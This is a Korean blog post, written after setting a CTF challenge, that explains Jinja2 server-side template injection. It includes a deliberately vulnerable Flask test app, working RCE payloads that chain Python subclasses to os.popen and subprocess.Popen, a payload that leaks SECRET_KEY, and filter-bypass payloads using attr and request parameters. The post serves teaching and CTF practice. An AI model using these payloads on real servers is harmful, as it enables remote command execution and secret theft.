--- 
layout: post
title: "Server-Side Template Injection(SSTI)"
author: "imreplay"
comments: true
tags: [web]
---

라온화이트햇 핵심연구팀 임재연

2021년 04월 24일 진행되었던 HSPACE CTF THE ZERO 대회 문제를 출제하면서 SSTI에 대한 내용과 필터링 우회 방법을 알게 되어 이와 관련된 주제로 포스팅을 작성하였습니다.

## 1. SSTI란?

`SSTI`(Server-Side Template Injection)는 템플릿을 사용하여 웹 어플리케이션을 구동할 때, 사용자의 입력이 적절하게 필터링 되지 않아 `템플릿 구문을 삽입` 할 수 있을 때 발생합니다.

삽입 된 템플릿은 `서버 측에서 해석` 되기 때문에 심각한 경우 `RCE`(Remote Code Execution) 취약점까지 연결 될 수도 있습니다.

## 2. jinja2 템플릿에서의 SSTI

![/assets/2021-05-01/SSTI_1.png](/assets/2021-05-01/SSTI_1.png)

출처 : [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)

웹 어플리케이션에서 사용되는 템플릿의 종류는 여러가지가 있습니다. portswigger 블로그에서는 몇 가지 단일 페이로드를 사용하여 템플릿을 식별하는 방법을 소개 하고 있습니다.

이번 포스팅에서는 여러 템플릿 중  `Jinja2` 템플릿에서 발생하는 SSTI 취약점에 대해 다루고자 합니다.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>My Webpage</title>
</head>
<body>
    <ul id="navigation">
    {% raw %}{% for item in navigation %}{% endraw %}
        <li><a href="{% raw %}{{ item.href }}{% endraw %}">{% raw %}{{ item.caption }}{% endraw %}</a></li>
    {% raw %}{% endfor %}{% endraw %}
    </ul>

    <h1>My Webpage</h1>
    {% raw %}{{ a_variable }}{% endraw %}

    {# a comment #}
</body>
</html>
```

위 코드는 jinja2 템플릿을 사용하는 기본적인 예시입니다. 

`{% raw %}{% 반복문(for) %}{% endraw%}`,  `{% raw %}{{ 값 출력 }}{% endraw %}`, `{# 주석 #}`

위와 같이 사용할 수 있으며, 이 중 이번 포스팅에서는 `{% raw %}{{ ... }}{% endraw %}` 를 사용할 예정입니다.

### 2.1 테스트 환경 구축

테스트를 위해 flask 모듈을 사용하여 간단한 웹 페이지를 만들었습니다.

```python
from flask import Flask, request, render_template, render_template_string

app = Flask(__name__)
app.secret_key = "my Secret!!"

filtering = []

@app.route('/')
def index():
  return render_template("index.html", title="SSTI Test Page", message="Test Page!")

@app.route('/submit', methods=['POST'])
def sbmit():
  parm1 = request.form.get('message') or None
  for word in filtering:
      if word in parm1:
          return "NoNo... [{}] - filter list [ ".format(word)+", ".join(filtering)+" ]"
  template = '''
  data = ({})
'''.format(parm1)
  return render_template_string(template)

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=5000)
```

코드를 살펴보면 POST 메소드로 요청을 받을 때, message로 전달 받은 값을 data = (`{}`) 에 넣고 `render_template_string` 함수를 사용하여 템플릿 구문을 해석하도록 하였습니다.

해당 페이지에  `{% raw %}{{7*7}}{% endraw %}` 이라는 데이터를 전송했을 때, 아래 그림과 같이 `7*7` 부분이 계산되어 화면에 표시되는 것을 확인 할 수 있습니다.

![/assets/2021-05-01/SSTI_2.png](/assets/2021-05-01/SSTI_2.png)

### 2.2. RCE with SSTI

jinja2 템플릿 구문 중 `{% raw %}{{ ... }}{% endraw %}` 구문은 중괄호 안의 값을 동적으로 화면에 표시하여 주는 기능을 가지고 있습니다. 

위 구문을 사용하여 RCE 취약점을 실행시키는 알려진 몇 가지 예시를 살펴보도록하겠습니다.

많은 공격 코드에서 RCE 취약점을 발생시키기 위해 python의 특수 어트리뷰트(Special Attributes)를 사용합니다.

![/assets/2021-05-01/SSTI_3.png](/assets/2021-05-01/SSTI_3.png)

 먼저 빈 문자열 `""` 에 `__class__` 를 사용하여 문자열의 클래스에 접근합니다.

![/assets/2021-05-01/SSTI_4.png](/assets/2021-05-01/SSTI_4.png)

실행 결과 `data = (<class 'str'>)`  응답이 온 것을 확인할 수 있습니다.

이어서 `str` 클래스에 `__base__` 를 사용하면 `data = (<class 'object'>)` 응답을 확인할 수 있으며, `object` 클래스에 접근 할 수 있습니다.

object class : The base class of the class hierarchy. 

![/assets/2021-05-01/SSTI_5.png](/assets/2021-05-01/SSTI_5.png)

다음으로 `__subclasses__()` 를 사용하여 `object` 클래스의 서브클래스 목록을 dict 형태로 반환하게 합니다.

![/assets/2021-05-01/SSTI_6.png](/assets/2021-05-01/SSTI_6.png)

조금 더 보기 쉽게 바꾸어 보면 아래와 같습니다.

![/assets/2021-05-01/SSTI_7.png](/assets/2021-05-01/SSTI_7.png)

- 응답 값 전체 보기

    ```python
    [<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>, <class 'mappingproxy'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'wrapper_descriptor'>, <class 'method-wrapper'>, <class 'ellipsis'>, <class 'member_descriptor'>, <class 'types.SimpleNamespace'>, <class 'PyCapsule'>, <class 'longrange_iterator'>, <class 'cell'>, <class 'instancemethod'>, <class 'classmethod_descriptor'>, <class 'method_descriptor'>, <class 'callable_iterator'>, <class 'iterator'>, <class 'pickle.PickleBuffer'>, <class 'coroutine'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class 'Context'>, <class 'ContextVar'>, <class 'Token'>, <class 'Token.MISSING'>, <class 'moduledef'>, <class 'module'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class 'classmethod'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'dict_itemiterator'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'types.GenericAlias'>, <class 'collections.abc.AsyncIterable'>, <class 'async_generator'>, <class 'collections.abc.Iterable'>, <class 'bytes_iterator'>, <class 'bytearray_iterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'range_iterator'>, <class 'set_iterator'>, <class 'str_iterator'>, <class 'tuple_iterator'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'enum.auto'>, <enum 'Enum'>, <class 're.Pattern'>, <class 're.Match'>, <class '_sre.SRE_Scanner'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'operator.itemgetter'>, <class 'operator.attrgetter'>, <class 'operator.methodcaller'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class '_collections._tuplegetter'>, <class 'collections._Link'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 're.Scanner'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'contextlib.ContextDecorator'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'typing._Final'>, <class 'typing._Immutable'>, <class 'typing.Generic'>, <class 'typing._TypingEmpty'>, <class 'typing._TypingEllipsis'>, <class 'typing.Annotated'>, <class 'typing.NamedTuple'>, <class 'typing.TypedDict'>, <class 'typing.io'>, <class 'typing.re'>, <class 'importlib.abc.Finder'>, <class 'importlib.abc.Loader'>, <class 'importlib.abc.ResourceReader'>, <class 'tokenize.Untokenizer'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class 'ast.AST'>, <class 'ast.NodeVisitor'>, <class '_random.Random'>, <class '_sha512.sha384'>, <class '_sha512.sha512'>, <class 'select.poll'>, <class 'select.epoll'>, <class 'selectors.BaseSelector'>, <class '_socket.socket'>, <class 'array.array'>, <class 'datetime.date'>, <class 'datetime.time'>, <class 'datetime.timedelta'>, <class 'datetime.tzinfo'>, <class 'urllib.parse._ResultMixinStr'>, <class 'urllib.parse._ResultMixinBytes'>, <class 'urllib.parse._NetlocResultMixinBase'>, <class 'calendar._localized_month'>, <class 'calendar._localized_day'>, <class 'calendar.Calendar'>, <class 'calendar.different_locale'>, <class 'email._parseaddr.AddrlistClass'>, <class '_struct.Struct'>, <class '_struct.unpack_iterator'>, <class 'string.Template'>, <class 'string.Formatter'>, <class 'email.charset.Charset'>, <class 'dis.Bytecode'>, <class 'inspect.BlockFinder'>, <class 'inspect._void'>, <class 'inspect._empty'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'weakref.finalize._Info'>, <class 'weakref.finalize'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'logging.LogRecord'>, <class 'logging.PercentStyle'>, <class 'logging.Formatter'>, <class 'logging.BufferingFormatter'>, <class 'logging.Filter'>, <class 'logging.Filterer'>, <class 'logging.PlaceHolder'>, <class 'logging.Manager'>, <class 'logging.LoggerAdapter'>, <class 'textwrap.TextWrapper'>, <class 'zlib.Compress'>, <class 'zlib.Decompress'>, <class '_bz2.BZ2Compressor'>, <class '_bz2.BZ2Decompressor'>, <class '_lzma.LZMACompressor'>, <class '_lzma.LZMADecompressor'>, <class 'zipfile.ZipInfo'>, <class 'zipfile.LZMACompressor'>, <class 'zipfile.LZMADecompressor'>, <class 'zipfile._SharedFile'>, <class 'zipfile._Tellable'>, <class 'zipfile.ZipFile'>, <class 'zipfile.Path'>, <class 'pkgutil.ImpImporter'>, <class 'pkgutil.ImpLoader'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>, <class 'platform._Processor'>, <class 'pyexpat.xmlparser'>, <class 'plistlib.UID'>, <class 'plistlib._PlistParser'>, <class 'plistlib._DumbXMLWriter'>, <class 'plistlib._BinaryPlistParser'>, <class 'plistlib._BinaryPlistWriter'>, <class 'email.header.Header'>, <class 'email.header._ValueFormatter'>, <class 'email._policybase._PolicyBase'>, <class 'email.feedparser.BufferedSubFile'>, <class 'email.feedparser.FeedParser'>, <class 'email.parser.Parser'>, <class 'email.parser.BytesParser'>, <class 'tempfile._RandomNameSequence'>, <class 'tempfile._TemporaryFileCloser'>, <class 'tempfile._TemporaryFileWrapper'>, <class 'tempfile.SpooledTemporaryFile'>, <class 'tempfile.TemporaryDirectory'>, <class 'pkg_resources.extern.VendorImporter'>, <class 'pkg_resources._vendor.appdirs.AppDirs'>, <class '__future__._Feature'>, <class 'pkg_resources.extern.packaging._structures.InfinityType'>, <class 'pkg_resources.extern.packaging._structures.NegativeInfinityType'>, <class 'pkg_resources.extern.packaging.version._BaseVersion'>, <class 'pkg_resources.extern.packaging.specifiers.BaseSpecifier'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class 'pkg_resources._vendor.pyparsing._Constants'>, <class 'pkg_resources._vendor.pyparsing._ParseResultsWithOffset'>, <class 'pkg_resources._vendor.pyparsing.ParseResults'>, <class 'pkg_resources._vendor.pyparsing.ParserElement._UnboundedCache'>, <class 'pkg_resources._vendor.pyparsing.ParserElement._FifoCache'>, <class 'pkg_resources._vendor.pyparsing.ParserElement'>, <class 'pkg_resources._vendor.pyparsing._NullToken'>, <class 'pkg_resources._vendor.pyparsing.OnlyOnce'>, <class 'pkg_resources._vendor.pyparsing.pyparsing_common'>, <class 'pkg_resources.extern.packaging.markers.Node'>, <class 'pkg_resources.extern.packaging.markers.Undefined'>, <class 'pkg_resources.extern.packaging.markers.Marker'>, <class 'pkg_resources.extern.packaging.requirements.Requirement'>, <class 'pkg_resources.IMetadataProvider'>, <class 'pkg_resources.WorkingSet'>, <class 'pkg_resources.Environment'>, <class 'pkg_resources.ResourceManager'>, <class 'pkg_resources.NullProvider'>, <class 'pkg_resources.NoDists'>, <class 'pkg_resources.EntryPoint'>, <class 'pkg_resources.Distribution'>, <class 'gunicorn.pidfile.Pidfile'>, <class 'gunicorn.sock.BaseSocket'>, <class 'gunicorn.arbiter.Arbiter'>, <class 'gettext.NullTranslations'>, <class 'argparse._AttributeHolder'>, <class 'argparse.HelpFormatter._Section'>, <class 'argparse.HelpFormatter'>, <class 'argparse.FileType'>, <class 'argparse._ActionsContainer'>, <class 'shlex.shlex'>, <class '_ssl._SSLContext'>, <class '_ssl._SSLSocket'>, <class '_ssl.MemoryBIO'>, <class '_ssl.Session'>, <class 'ssl.SSLObject'>, <class 'gunicorn.reloader.InotifyReloader'>, <class 'gunicorn.config.Config'>, <class 'gunicorn.config.Setting'>, <class 'gunicorn.debug.Spew'>, <class 'gunicorn.app.base.BaseApplication'>, <class '_pickle.Pdata'>, <class '_pickle.PicklerMemoProxy'>, <class '_pickle.UnpicklerMemoProxy'>, <class '_pickle.Pickler'>, <class '_pickle.Unpickler'>, <class 'pickle._Framer'>, <class 'pickle._Unframer'>, <class 'pickle._Pickler'>, <class 'pickle._Unpickler'>, <class '_queue.SimpleQueue'>, <class 'queue.Queue'>, <class 'queue._PySimpleQueue'>, <class 'logging.handlers.QueueListener'>, <class 'socketserver.BaseServer'>, <class 'socketserver.ForkingMixIn'>, <class 'socketserver._NoThreads'>, <class 'socketserver.ThreadingMixIn'>, <class 'socketserver.BaseRequestHandler'>, <class 'logging.config.ConvertingMixin'>, <class 'logging.config.BaseConfigurator'>, <class 'gunicorn.glogging.Logger'>, <class 'gunicorn.http.body.ChunkedReader'>, <class 'gunicorn.http.body.LengthReader'>, <class 'gunicorn.http.body.EOFReader'>, <class 'gunicorn.http.body.Body'>, <class 'gunicorn.http.message.Message'>, <class 'gunicorn.http.unreader.Unreader'>, <class 'gunicorn.http.parser.Parser'>, <class 'gunicorn.http.wsgi.FileWrapper'>, <class 'gunicorn.http.wsgi.Response'>, <class 'gunicorn.workers.workertmp.WorkerTmp'>, <class 'gunicorn.workers.base.Worker'>, <class 'markupsafe._MarkupEscapeHelper'>, <class '_hashlib.HASH'>, <class '_hashlib.HMAC'>, <class '_blake2.blake2b'>, <class '_blake2.blake2s'>, <class '_json.Scanner'>, <class '_json.Encoder'>, <class 'json.decoder.JSONDecoder'>, <class 'json.encoder.JSONEncoder'>, <class 'jinja2.utils.MissingType'>, <class 'jinja2.utils.LRUCache'>, <class 'jinja2.utils.Cycler'>, <class 'jinja2.utils.Joiner'>, <class 'jinja2.utils.Namespace'>, <class 'jinja2.bccache.Bucket'>, <class 'jinja2.bccache.BytecodeCache'>, <class 'jinja2.nodes.EvalContext'>, <class 'jinja2.nodes.Node'>, <class 'jinja2.visitor.NodeVisitor'>, <class 'jinja2.idtracking.Symbols'>, <class 'jinja2.compiler.MacroRef'>, <class 'jinja2.compiler.Frame'>, <class 'jinja2.runtime.TemplateReference'>, <class 'jinja2.runtime.Context'>, <class 'jinja2.runtime.BlockReference'>, <class 'jinja2.runtime.LoopContext'>, <class 'jinja2.runtime.Macro'>, <class 'jinja2.runtime.Undefined'>, <class 'decimal.Decimal'>, <class 'decimal.Context'>, <class 'decimal.SignalDictMixin'>, <class 'decimal.ContextManager'>, <class 'numbers.Number'>, <class 'jinja2.lexer.Failure'>, <class 'jinja2.lexer.TokenStreamIterator'>, <class 'jinja2.lexer.TokenStream'>, <class 'jinja2.lexer.Lexer'>, <class 'jinja2.parser.Parser'>, <class 'jinja2.environment.Environment'>, <class 'jinja2.environment.Template'>, <class 'jinja2.environment.TemplateModule'>, <class 'jinja2.environment.TemplateExpression'>, <class 'jinja2.environment.TemplateStream'>, <class 'jinja2.loaders.BaseLoader'>, <class 'werkzeug._internal._Missing'>, <class 'werkzeug._internal._DictAccessorProperty'>, <class 'werkzeug.utils.HTMLBuilder'>, <class 'werkzeug.exceptions.Aborter'>, <class 'werkzeug.urls.Href'>, <class 'email.message.Message'>, <class 'http.client.HTTPConnection'>, <class 'mimetypes.MimeTypes'>, <class 'click._compat._FixupStream'>, <class 'click._compat._AtomicFile'>, <class 'click.utils.LazyFile'>, <class 'click.utils.KeepOpenFile'>, <class 'click.utils.PacifyFlushWrapper'>, <class 'click.parser.Option'>, <class 'click.parser.Argument'>, <class 'click.parser.ParsingState'>, <class 'click.parser.OptionParser'>, <class 'click.types.ParamType'>, <class 'click.formatting.HelpFormatter'>, <class 'click.core.Context'>, <class 'click.core.BaseCommand'>, <class 'click.core.Parameter'>, <class 'werkzeug.serving.WSGIRequestHandler'>, <class 'werkzeug.serving._SSLContext'>, <class 'werkzeug.serving.BaseWSGIServer'>, <class 'werkzeug.datastructures.ImmutableListMixin'>, <class 'werkzeug.datastructures.ImmutableDictMixin'>, <class 'werkzeug.datastructures.UpdateDictMixin'>, <class 'werkzeug.datastructures.ViewItems'>, <class 'werkzeug.datastructures._omd_bucket'>, <class 'werkzeug.datastructures.Headers'>, <class 'werkzeug.datastructures.ImmutableHeadersMixin'>, <class 'werkzeug.datastructures.IfRange'>, <class 'werkzeug.datastructures.Range'>, <class 'werkzeug.datastructures.ContentRange'>, <class 'werkzeug.datastructures.FileStorage'>, <class 'urllib.request.Request'>, <class 'urllib.request.OpenerDirector'>, <class 'urllib.request.BaseHandler'>, <class 'urllib.request.HTTPPasswordMgr'>, <class 'urllib.request.AbstractBasicAuthHandler'>, <class 'urllib.request.AbstractDigestAuthHandler'>, <class 'urllib.request.URLopener'>, <class 'urllib.request.ftpwrapper'>, <class 'werkzeug.wrappers.accept.AcceptMixin'>, <class 'werkzeug.wrappers.auth.AuthorizationMixin'>, <class 'werkzeug.wrappers.auth.WWWAuthenticateMixin'>, <class 'werkzeug.wsgi.ClosingIterator'>, <class 'werkzeug.wsgi.FileWrapper'>, <class 'werkzeug.wsgi._RangeWrapper'>, <class 'werkzeug.formparser.FormDataParser'>, <class 'werkzeug.formparser.MultiPartParser'>, <class 'werkzeug.wrappers.base_request.BaseRequest'>, <class 'werkzeug.wrappers.base_response.BaseResponse'>, <class 'werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin'>, <class 'werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin'>, <class 'werkzeug.wrappers.etag.ETagRequestMixin'>, <class 'werkzeug.wrappers.etag.ETagResponseMixin'>, <class 'werkzeug.wrappers.cors.CORSRequestMixin'>, <class 'werkzeug.wrappers.cors.CORSResponseMixin'>, <class 'werkzeug.useragents.UserAgentParser'>, <class 'werkzeug.useragents.UserAgent'>, <class 'werkzeug.wrappers.user_agent.UserAgentMixin'>, <class 'werkzeug.wrappers.request.StreamOnlyMixin'>, <class 'werkzeug.wrappers.response.ResponseStream'>, <class 'werkzeug.wrappers.response.ResponseStreamMixin'>, <class 'http.cookiejar.Cookie'>, <class 'http.cookiejar.CookiePolicy'>, <class 'http.cookiejar.Absent'>, <class 'http.cookiejar.CookieJar'>, <class 'werkzeug.test._TestCookieHeaders'>, <class 'werkzeug.test._TestCookieResponse'>, <class 'werkzeug.test.EnvironBuilder'>, <class 'werkzeug.test.Client'>, <class 'uuid.UUID'>, <class 'itsdangerous._json._CompactJSON'>, <class 'hmac.HMAC'>, <class 'itsdangerous.signer.SigningAlgorithm'>, <class 'itsdangerous.signer.Signer'>, <class 'itsdangerous.serializer.Serializer'>, <class 'itsdangerous.url_safe.URLSafeSerializerMixin'>, <class 'flask._compat._DeprecatedBool'>, <class 'werkzeug.local.Local'>, <class 'werkzeug.local.LocalStack'>, <class 'werkzeug.local.LocalManager'>, <class 'werkzeug.local.LocalProxy'>, <class 'dataclasses._HAS_DEFAULT_FACTORY_CLASS'>, <class 'dataclasses._MISSING_TYPE'>, <class 'dataclasses._FIELD_BASE'>, <class 'dataclasses.InitVar'>, <class 'dataclasses.Field'>, <class 'dataclasses._DataclassParams'>, <class 'difflib.SequenceMatcher'>, <class 'difflib.Differ'>, <class 'difflib.HtmlDiff'>, <class 'werkzeug.routing.RuleFactory'>, <class 'werkzeug.routing.RuleTemplate'>, <class 'werkzeug.routing.BaseConverter'>, <class 'werkzeug.routing.Map'>, <class 'werkzeug.routing.MapAdapter'>, <class 'flask.signals.Namespace'>, <class 'flask.signals._FakeSignal'>, <class 'flask.helpers.locked_cached_property'>, <class 'flask.helpers._PackageBoundObject'>, <class 'flask.cli.DispatchingApp'>, <class 'flask.cli.ScriptInfo'>, <class 'flask.config.ConfigAttribute'>, <class 'flask.ctx._AppCtxGlobals'>, <class 'flask.ctx.AppContext'>, <class 'flask.ctx.RequestContext'>, <class 'flask.json.tag.JSONTag'>, <class 'flask.json.tag.TaggedJSONSerializer'>, <class 'flask.sessions.SessionInterface'>, <class 'werkzeug.wrappers.json._JSONModule'>, <class 'werkzeug.wrappers.json.JSONMixin'>, <class 'flask.blueprints.BlueprintSetupState'>, <class 'jinja2._compat.temporary_class'>, <class 'jinja2.ext.Extension'>, <class 'jinja2.ext._CommentFinder'>]
    ```

다양한 클래스들을 확인할 수 있으며, 이제 원하는 클래스를 가져와 사용할 수 있습니다.

아래 두 가지 예시는 `codecs.IncrementalDecoder` 클래스와 `subprocess.Popen` 클래스를 사용하여 명령어를 실행하는 예시입니다.

```python
# 109 : <class 'codecs.IncrementalDecoder'>
{% raw %}{{"".__class__.__base__.__subclasses__()[109].__init__.__globals__['sys'].modules['os'].popen('ls').read()}}{% endraw %}
```

![/assets/2021-05-01/SSTI_8.png](/assets/2021-05-01/SSTI_8.png)

```python
# 273 : <class 'subprocess.Popen'>
{% raw %}{{"".__class__.__base__.__subclasses__()[273]('ls',shell=True,stdout=-1).communicate()[0].strip()}}{% endraw %}
```

![/assets/2021-05-01/SSTI_9.png](/assets/2021-05-01/SSTI_9.png)

두 가지 공격 코드 모두 서버에서 명령을 실행하고 그 결과를 반환해 주는 것을 확인할 수 있습니다.

109, 273등 index값은 서버 환경에 따라 달라질 수 있습니다.

### 2.3. get secret_key with SSTI

 

SSTI 취약점을 통해 명령어를 실행하는 것 뿐만 아니라 서버의 중요 정보를 탈취할 수도 있습니다.

처음 테스트 환경을 구축할 때 다음과 같이 secret_key를 설정 해두었습니다.

```python
app = Flask(__name__)
app.secret_key = "my Secret!!"
```

SSTI취약점이 존재하고, 적절한 필터링이 수행되지 않을 경우, 설정되어있는 secret_key를 확인할 수 있습니다.

```python
{% raw %}{{config['SECRET_KEY']}}{% endraw %}
```

![/assets/2021-05-01/SSTI_10.png](/assets/2021-05-01/SSTI_10.png)

## 3. SSTI 필터링 우회 in CTF - jinja2

 

앞서 살펴본 것처럼 SSTI 취약점을 통해 명령어를 실행하거나, Secret_key 를 탈취할 수 있었습니다. 

그렇기 때문에 종종 CTF 문제에서는 SSTI 취약점을 사용해야하는 문제를 출제할 때 필터링을 추가하기도 합니다.

필터링의 한가지 예시로 `__class__` 와 같은 attribute의 사용을 방지하기 위해 `_` 문자를 필터링하거나, `config` 등의 문자열을 필터링 하기도 합니다. 

이러한 필터링은 다양한 방법으로 우회가 가능합니다.

### 3.1. case.1 - attr을 이용한 방법

 

jinja2 템플릿에서 사용할 수 있는 기능 중 `Builtin Filters` 가 존재합니다.

![/assets/2021-05-01/SSTI_11.png](/assets/2021-05-01/SSTI_11.png)

이 중 `attr` 필터를 사용하여 문자열 필터링을 우회할 수 있습니다.

![/assets/2021-05-01/SSTI_12.png](/assets/2021-05-01/SSTI_12.png)

우리가 사용하고 싶은 코드인 `"".__class__` 를 `""|attr("\x5f\x5fclass\x5f\x5f")` 와 같이 작성하여 동일한 기능을 수행하게 할 수 있습니다.

"\x5f" == "_"

![/assets/2021-05-01/SSTI_13.png](/assets/2021-05-01/SSTI_13.png)

이를 통해 `_` 문자를 우회하여 공격 코드를 전송 할 수 있습니다.

```python
# 273 : <class 'subprocess.Popen'>
{% raw %}{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(273)('id',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)}}{% endraw %}
```

![/assets/2021-05-01/SSTI_14.png](/assets/2021-05-01/SSTI_14.png)

### 3.2. case.2 - request, attr을 이용한 방법

 

소스코드를 다시 한번 살펴보면 필터링에 대한 체크를 message 파라미터에 대해서만 하는 것을 확인할 수 있습니다.

```python
from flask import Flask, request, render_template, render_template_string

app = Flask(__name__)
app.secret_key = "my Secret!!"

filtering = []

@app.route('/')
def index():
  return render_template("index.html", title="SSTI Test Page", message="Test Page!")

@app.route('/submit', methods=['POST'])
def sbmit():
  parm1 = request.form.get('message') or None
  for word in filtering:
      if word in parm1:
          return "NoNo... [{}] - filter list [ ".format(word)+", ".join(filtering)+" ]"
  template = '''
  data = ({})
'''.format(parm1)
  return render_template_string(template)

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=5000)
```

필터링을 다음과 같이 추가하고 테스트를 진행하였습니다.

```python
filtering = ["os", "config", "_", "\\x5f","join"]
```

```python
{% raw %}{{""|attr(request.form.get('test'))}}{% endraw %}
```

`request.form.get` 을 사용하여 test 파라미터로 들어오는 값을 attr 필터에 넣어주는 예시입니다. test 파라미터에는 `__class__` 를 추가해주었습니다.

![/assets/2021-05-01/SSTI_15.png](/assets/2021-05-01/SSTI_15.png)

이를 활용하여 앞서 사용했던 공격 코드를 다시 만들어보면 다음과 같습니다.

```python
{% raw %}{{""|attr(request.form.get('test1'))|attr(request.form.get('test2'))|attr(request.form.get('test3'))()|attr(request.form.get('test4'))(273)('ls',shell=True,stdout=-1)|attr('communicate')()|attr(request.form.get('test4'))(0)}}{% endraw %}
```

![/assets/2021-05-01/SSTI_16.png](/assets/2021-05-01/SSTI_16.png)

지금까지 다루었던 방법 외에도 `join` 필터를 사용하거나,  그 외에도 다양한 방법으로 필터링 우회가 가능합니다.

## 5. 참고자료

 

[https://core-research-team.github.io/2020-07-01/Vulnerabilities-of-Flask](https://core-research-team.github.io/2020-07-01/Vulnerabilities-of-Flask)

[https://jinja.palletsprojects.com/en/2.11.x/templates/](https://jinja.palletsprojects.com/en/2.11.x/templates/)

[https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)

[https://0day.work/jinja2-template-injection-filter-bypasses/](https://0day.work/jinja2-template-injection-filter-bypasses/)

[https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f](https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f)

[https://en.wikipedia.org/wiki/Jinja_(template_engine)](https://en.wikipedia.org/wiki/Jinja_(template_engine))

[https://www.programmersought.com/article/91565232044/](https://www.programmersought.com/article/91565232044/)

[https://docs.python.org/3/library/stdtypes.html#special-attributes](https://docs.python.org/3/library/stdtypes.html#special-attributes)